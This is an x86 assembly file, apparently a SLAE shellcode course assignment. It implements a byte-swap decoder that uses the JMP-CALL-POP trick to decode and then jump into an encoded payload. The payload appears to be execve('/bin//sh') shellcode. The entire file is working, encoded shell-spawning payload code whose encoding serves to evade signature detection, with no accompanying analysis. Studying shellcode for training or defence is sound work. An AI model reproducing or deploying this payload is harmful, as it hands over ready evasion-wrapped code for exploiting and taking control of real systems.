; Paolo Stagno aka [VoidSec](https://voidsec.com)
; SLAE-1511

global _start

section .text
_start:
	jmp short shellcode_section		; goto shellcode_section

decoder:					; decoder's main
	pop esi					; load address of our encoded shellcode (encoded_shellcode) into ESI (JMP CALL POP trick)
	mul ecx					; trick to clear eax and exc
	mov cl, 10				; loop half the times of our shellcode length as we are swapping two bytes at time (eg. shellcode length is 20)

decode_loop:
	mov  al, byte [esi]			; load encoded_shellcode's byte pointed by ESI in al 	| [A][B] al=A
	xchg byte [esi+1], al			; swap al value with next byte value (ESI+1) 		| [A][A] al=B
	mov [esi], al				; load swapped byte in al to location pointed by ESI	| [B][A]
        add esi, 2				; select next byte "couple"				
        loop decode_loop			; cl is 0? No, we go back at decode_loop and execute the cicle again
        jmp short encoded_shellcode		; cl is 0, we've decoded all our shellcode and we can now directly jump into it

shellcode_section:
        call decoder				; goto decoder's main, putting encoded_shellcode on the stack
        encoded_shellcode: db 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80
